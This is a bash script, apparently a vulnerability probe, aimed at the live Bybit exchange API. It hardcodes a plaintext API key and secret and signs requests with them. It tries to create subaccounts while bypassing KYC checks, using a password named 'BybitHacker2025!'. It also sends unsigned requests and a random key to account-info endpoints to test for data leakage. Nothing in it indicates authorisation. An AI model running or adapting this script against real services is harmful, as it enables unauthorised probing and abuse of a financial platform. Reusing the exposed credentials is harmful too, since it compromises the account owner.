#!/bin/bash
# SUBACCOUNT & KEY LEAK PROBE (Vectors #1 & #3)

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"

# Sync Time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
OFFSET=$((SERVER_TIME - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}10000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo ">>> VECTOR #1: Checking Subaccount Permissions"
echo "Endpoint: /v5/user/sub-member/list"

IFS='|' read -r ts sig <<< $(sign "")
curl -s "$BASE/v5/user/sub-member/list?limit=1" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 10000" 

echo -e "\n\n>>> VECTOR #1: Attempting Subaccount Creation (No KYC Check)"
# Generate random subuser
SUB_USER="sub_$(date +%s)"
PAYLOAD="{\"username\":\"$SUB_USER\",\"password\":\"BybitHacker2025!\",\"memberType\":1,\"switch\":1}"
IFS='|' read -r ts sig <<< $(sign "$PAYLOAD")

curl -s -X POST "$BASE/v5/user/create-sub-member" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 10000" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD"

echo -e "\n\n>>> VECTOR #3: API Key Info Leakage (No Signature)"
echo "Trying to get info about API Key WITHOUT signature..."
# Testing with OUR key first, then random key
curl -s "$BASE/v5/account/info" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "Content-Type: application/json"

echo -e "\n\n>>> VECTOR #3: Testing Random Key Leakage"
RANDOM_KEY="XyZ123RandomKey456"
curl -s "$BASE/v5/account/info" \
    -H "X-BAPI-API-KEY: $RANDOM_KEY" \
    -H "Content-Type: application/json"
